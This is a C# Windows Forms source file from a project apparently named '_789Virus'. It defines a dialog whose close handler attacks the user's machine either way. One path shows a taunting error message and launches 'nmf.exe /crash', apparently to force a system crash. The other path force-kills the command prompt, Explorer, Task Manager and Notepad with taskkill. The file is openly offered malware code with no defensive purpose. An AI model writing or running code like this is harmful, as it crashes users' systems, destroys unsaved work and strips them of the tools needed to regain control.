using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace _789Virus.Forms
{
    public partial class tip : Form
    {
        bool temp = false;

        public tip()
        {
            InitializeComponent();
        }

        private void button2_Click(object sender, EventArgs e)
        {
            temp = false;
            this.Close();
        }

        private void tip_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (!temp)
            {
                MessageBox.Show("屡教不改.无可救药.", "EEEEE", MessageBoxButtons.OK, MessageBoxIcon.Error);
                Process.Start("nmf.exe", "/crash");
            }
            else
            {
                Process.Start("cmd.exe", "/c taskkill /f /im cmd.exe");
                Process.Start("cmd.exe", "/c taskkill /f /im explorer.exe");
                Process.Start("cmd.exe", "/c taskkill /f /im taskmgr.exe");
                Process.Start("cmd.exe", "/c taskkill /f /im notepad.exe");
            }
            
        }

        private void button1_Click(object sender, EventArgs e)
        {
            temp = true;
            this.Close();
        }
    }
}
